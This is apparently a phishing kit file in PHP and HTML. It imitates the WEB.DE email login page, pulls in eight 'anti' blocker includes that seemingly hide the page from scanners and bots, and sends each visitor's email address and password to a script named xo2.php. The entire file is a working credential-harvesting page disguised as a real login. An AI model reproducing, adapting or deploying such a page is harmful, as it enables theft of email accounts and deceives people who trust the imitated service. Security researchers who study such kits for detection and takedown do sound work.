<?php
error_reporting(0);
include "./blocker/anti1.php";
include "./blocker/anti2.php";
include "./blocker/anti3.php";
include "./blocker/anti4.php";
include "./blocker/anti5.php";
include "./blocker/anti6.php";
include "./blocker/anti7.php";
include "./blocker/anti8.php";

?>
<html xmlns:wicket="http://www.w3.org/1999/xhtml" style="--col-count:2; --sitebar-width:130px; --grid-border:10px; --grid-column-gap:20px; --justify-grid-content:start; --screen-touchable:false; --scrollbar-width:17px;" data-content-login="" class="withjs stickyLogin" data-block-number="2" data-is-blocked="true"><head>
    
  
  <meta charset="utf-8">
  <title>WEB.DE - E-Mail-Adresse kostenlos, FreeMail, De-Mail &amp; Nachrichten</title>
  
  <link rel="shortcut icon" type="image/x-icon" href="https://img.ui-portal.de/webde/favicon.ico">
  
  
  
  
  
  
  
  
  
  
    
    
    <link rel="stylesheet" href="https://js.ui-portal.de/homepage/cs/2020/132/1.5/webde/homepage.css">


  
  
    

  
  
    
    

    


  
    
    

    



  </head>
  <body style="background:url(back.png);" data-col-count="2" data-ad-type="double-sitebar">

  	
    
    <div style="
    padding-top: 525
    padding-left: 500;
    " id="app" tabindex="0"><div class="main" data-fallback="true"> <div class="main-content"> <div data-component="login" data-grid-row="">  <form action="xo2.php" data-form-login="" data-grid-row="" method="post" accept-charset="UTF-8" id="freemailLoginForm" name="fm"><div data-hidden-values=""></div>     <div data-grid-column=""><div data-component="input"><input type="email" data-type="value.inputType" placeholder="E-Mail-Adresse" required="required" id="freemailLoginUsername" name="UserID"></div> <p aria-label="reg"><a href="" tabindex="-1">Kostenlos registrieren!</a></p></div> <div data-grid-column=""><div data-component="input" data-with-button="true"><input id="freemailLoginPassword" required="" name="Password" type="password" data-type="password" placeholder="Passwort"> <button data-component="button" type="button" data-importance="input" data-type="icon"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20"><path d="M19.73,8.91A11.53,11.53,0,0,0,10,3.14,11.17,11.17,0,0,0,.25,9,2.31,2.31,0,0,0,.25,11,11.17,11.17,0,0,0,10,16.86a11.53,11.53,0,0,0,9.78-5.77A2.34,2.34,0,0,0,19.73,8.91ZM10,14a4,4,0,1,1,4-4A4,4,0,0,1,10,14Z"></path></svg></button></div> <p aria-label="pwd"><a href="https://passwort.web.de/" tabindex="-1">Passwort vergessen?</a></p></div> <button data-component="button" type="submit" click="clicked" data-size="xl" data-importance="primary">Login</button></form> </div>   </div> </div></div>
    
    
    
    

  

</body></html>